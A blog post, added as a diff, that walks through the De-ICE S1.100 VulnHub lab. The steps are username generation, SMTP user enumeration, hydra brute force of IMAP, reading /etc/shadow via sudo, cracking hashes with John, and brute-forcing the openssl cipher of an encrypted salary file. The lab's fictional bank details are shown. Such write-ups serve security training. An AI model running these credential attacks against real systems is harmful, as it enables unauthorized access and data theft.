@@ -1,0 +1,253 @@
+---
+layout: post
+title: "DE-ICE-S1.100"
+date: 2015-05-09 20:55:07 +0200
+comments: true
+categories: [vulnhub, deice]
+---
+Image: [De-ICE: S1.100](https://www.vulnhub.com/entry/de-ice-s1100,8/)
+
+The output from nmap:
+{% codeblock %}
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+443/tcp closed https
+MAC Address: 00:0C:29:53:2F:A3 (VMware)
+{% endcodeblock %}
+
+We connect to the web site and save the staff names to the file:
+{% codeblock %}
+$ cat names.txt 
+Marie Mary
+Pat Patrick
+Terry Thompson
+Ben Benedict
+Erin Gennieg
+Paul Michael
+Ester Long
+Adam Adams
+Bob Banter
+Chad Coffee
+{% endcodeblock %}
+
+Using this script [namelist.py](https://gist.githubusercontent.com/superkojiman/11076951/raw/865a89c2db01c2a5589c534b7f56d1669dddf0ab/namemash.py)
+we generate the potential login names:
+
+{% codeblock %}
+$ cat userlist.txt
+mariemary
+marymarie
+marie.mary
+mary.marie
+marym
+mmary
+mmarie
+m.mary
+m.marie
+marie
+mary
+patpatrick
+patrickpat
+pat.patrick
+patrick.pat
+patrickp
+ppatrick
+ppat
+p.patrick
+p.pat
+pat
+patrick
+terrythompson
+thompsonterry
+terry.thompson
+thompson.terry
+thompsont
+tthompson
+tterry
+t.thompson
+t.terry
+terry
+thompson
+benbenedict
+benedictben
+ben.benedict
+benedict.ben
+benedictb
+bbenedict
+bben
+b.benedict
+b.ben
+ben
+benedict
+eringennieg
+genniegerin
+erin.gennieg
+gennieg.erin
+genniege
+egennieg
+gerin
+e.gennieg
+g.erin
+erin
+gennieg
+paulmichael
+michaelpaul
+paul.michael
+michael.paul
+michaelp
+pmichael
+mpaul
+p.michael
+m.paul
+paul
+michael
+esterlong
+longester
+ester.long
+long.ester
+longe
+elong
+lester
+e.long
+l.ester
+ester
+long
+adamadams
+adamsadam
+adam.adams
+adams.adam
+adamsa
+aadams
+aadam
+a.adams
+a.adam
+adam
+adams
+bobbanter
+banterbob
+bob.banter
+banter.bob
+banterb
+bbanter
+bbob
+b.banter
+b.bob
+bob
+banter
+chadcoffee
+coffeechad
+chad.coffee
+coffee.chad
+coffeec
+ccoffee
+cchad
+c.coffee
+c.chad
+chad
+coffee
+{% endcodeblock %}
+
+In this case, the better way should be use SMTP enumeration:
+{% codeblock %}
+mail from: a@slax.example.net
+250 2.1.0 a@slax.example.net... Sender ok
+rcpt to: bbanter@slax.example.net
+250 2.1.5 bbanter@slax.example.net... Recipient ok
+rcpt to: bbanter
+250 2.1.5 bbanter@slax.example.net... Recipient ok
+rcpt to: aadam
+550 5.1.1 aadam... User unknown
+rcpt to: aadams
+250 2.1.5 aadams... Recipient ok
+{% endcodeblock %}
+
+We use hydra to perform brute-force attack via imap service:
+{% codeblock %}
+$ hydra -L userlist.txt 192.168.1.100 imap -u -e nsr
+[143][imap] host: 192.168.1.100   login: bbanter   password: bbanter
+{% endcodeblock %}
+
+After login as bbanter, we download the /etc/passwd file to create more accurate wordlist:
+{% codeblock %}
+$ cat userlist2.txt
+aadams
+ccoffee
+{% endcodeblock %}
+
+{% codeblock %}
+$ hydra -L userlist2.txt 192.168.1.100 imap -u -P /usr/share/wordlists/rockyou.txt
+[143][imap] host: 192.168.1.100   login: aadams   password: nostradamus
+{% endcodeblock %}
+
+We found no working exploit using [Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester).
+
+User aadams is in the wheel group:
+{% codeblock %}
+/etc/passwd:
+aadams:x:1000:10:,,,:/home/aadams:/bin/bash
+/etc/group:
+wheel::10:root
+{% endcodeblock %}
+
+Checking sudo -l reveals how to get root hash:
+{% codeblock %}
+$ sudo -l
+User aadams may run the following commands on this host:
+    (root) NOEXEC: /bin/ls
+    (root) NOEXEC: /usr/bin/cat
+    (root) NOEXEC: /usr/bin/more
+    (root) NOEXEC: !/usr/bin/su *root*
+
+aadams@slax:/tmp$ sudo cat /etc/shadow
+root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
+ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
+{% endcodeblock %}
+
+Using John, we cracked these hashes:
+{% codeblock %}
+tarot            (root)
+hierophant       (ccoffee)
+{% endcodeblock %}
+
+We find salary_dec2003.csv.enc in FTP directory and because there is suspicous
+line in /etc/passwd (DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION), we
+know that the password for this file could be the same as for root.
+
+For this purpose, we wroted the following script:
+{% codeblock lang:bash %}
+$ cat crack-openssl.sh
+#!/usr/bin/env bash
+
+ciphers=`openssl list-cipher-commands`
+
+for c in $ciphers; do
+  openssl enc -d -"$c" -in salary_dec2003.csv.enc -k tarot -out csv/salary_dec2003.csv.$c-decrypted
+done
+{% endcodeblock %}
+
+In a few gibberish files we read csv/salary_dec2003.csv.aes-128-cbc-decrypted:
+{% codeblock %}
+$ cat csv/salary_dec2003.csv.aes-128-cbc-decrypted  | head -15
+,Employee information,,,,,,,,,,,,,,
+,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage
+),Total Taxes Withheld (Percentage),"Insurance
+Deduction
+(Dollars)","Other Regular
+Deduction
+(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info
+Routing Number","Direct Deposit Info
+Account Number"
+,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
+,2,Marie Mary,"$56,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
+,3,Pat Patrick,"$43,350.00",1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
+,4,Terry Thompson,"$27,500.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
+,5,Ben Benedict,"$29,750.00",1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
+,6,Erin Gennieg,"$105,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
+,7,Paul Michael,"$76,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756
+{% endcodeblock %}
